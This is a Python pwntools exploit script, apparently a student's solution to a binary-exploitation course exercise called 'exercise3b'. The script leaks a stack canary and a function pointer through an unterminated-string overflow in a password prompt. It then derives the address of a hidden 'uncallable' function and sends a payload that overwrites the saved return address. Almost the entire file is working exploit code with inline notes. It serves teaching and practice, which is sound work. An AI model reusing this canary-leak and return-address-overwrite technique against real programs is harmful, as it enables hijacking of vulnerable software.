#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
#exe = 'handout/exercise3/exercise3b'
exe = './exercise3b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
'''
arch     x86
baddr    0x0
binsz    15344
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      true
relocs   true
relro    full
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
'''
'''
0x00001269 31 sym.uncallable
0x00001288 30 sym.print_hello <-- some function pointer? Offset from table; if location of this function found, add offset to get location of uncallable
0x000012a6 60 sym.readLine
0x000012e2 146 sym.check_authorization
0x00001374 324 main
0x00001374 324 sym.main
'''

#check_authorization allocates 0xe0 = 224 bytes of the stack for its frame
#the canary is located at rbp - 0x14 = rbp - 20 bytes (observe it's right in the middle of a stackslot -> 32 bit canary value)

#Canary extraction
print("Msg 1: ", end="")
print(r.recvline()) #Enter the secret password\n

read_int_value = (208 - 32 - 1) * b"A" #-1 to make space for \n; fill stack until it hits canary.
r.sendline(read_int_value) #is uses sys.readLine(), so the input str;ing is not terminated with \x00 but with \n

print("Msg 2: ", end="")
print(r.recvline()) #Well of course [%s]\n

print("Msg 3: ", end="")
content = r.recvline()
print(content) #[relevant] is not the password\n; first 4 bytes are canary e.g. b'\xefR\x9b\xc9\x88\x12z[\xd1U'

print("Length: ", end="")
print(len(content)) #10; content is e.g. b'\xefR\x9b\xc9\x88\x12z[\xd1U'

canary = content[:4] #bytes
print("Canary: ", end="")
print(canary)

#The first argument for check_authorization is the sym.print_hello function (a ptr to it)

arg1_func_ptr = content[4:10] #length 6
arg1_func_ptr = arg1_func_ptr + (8 - len(arg1_func_ptr)) * b'\x00' #64 bit address

offset = 0x00001288 - 0x00001269 #31; from above

new_ret_address = int(bytes.hex(arg1_func_ptr[::-1]), base = 16) - offset
new_ret_address = bytes.fromhex(hex(new_ret_address)[2:])[::-1]
new_ret_address = new_ret_address + (8 - len(new_ret_address)) * b"\x00"

# to_main_ret_address_overwrite = hex(int(to_main_ret_address_overwrite[2:-1].decode(), base=16) + 24).encode() + b"\n"
# to_main_ret_address_overwrite = bytes(bytearray(bytes.fromhex(to_main_ret_address_overwrite[2:-1].decode())))[::-1]
# to_main_ret_address_overwrite = to_main_ret_address_overwrite + (8 - len(to_main_ret_address_overwrite)) * b"\x00"

pre_canary = (208 - 32) * b'A'
post_canary_frame = (32 - 4) * b'B'
main_rbp_value = 8 * b'C'
# new_ret_address = b"\x56\x12\x40\x00\x00\x00\x00\x00"

payload = pre_canary + canary + post_canary_frame + main_rbp_value + new_ret_address
r.sendline(payload)
print("Final Msg: ", end="")
# r.recvline()
print(r.recvall(timeout=5))

# print(r.recvline()) #Unauthorized. Try again\n